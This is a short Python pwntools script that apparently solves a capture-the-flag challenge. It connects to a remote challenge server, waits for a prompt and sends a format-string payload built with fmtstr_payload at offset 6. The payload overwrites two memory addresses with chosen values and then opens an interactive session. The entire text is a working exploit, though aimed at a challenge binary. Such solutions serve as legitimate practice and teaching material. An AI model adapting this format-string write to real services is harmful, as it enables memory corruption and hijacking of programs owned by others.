from pwn import *

context.binary = exe = ELF('./chall')
io = remote('tjc.tf', 31764)

io.recvuntil(b'else): ')
paylaod = fmtstr_payload(6, {0x403440:0x403560, 0x403560:0x86A693E-2})
io.sendline(paylaod)
io.interactive()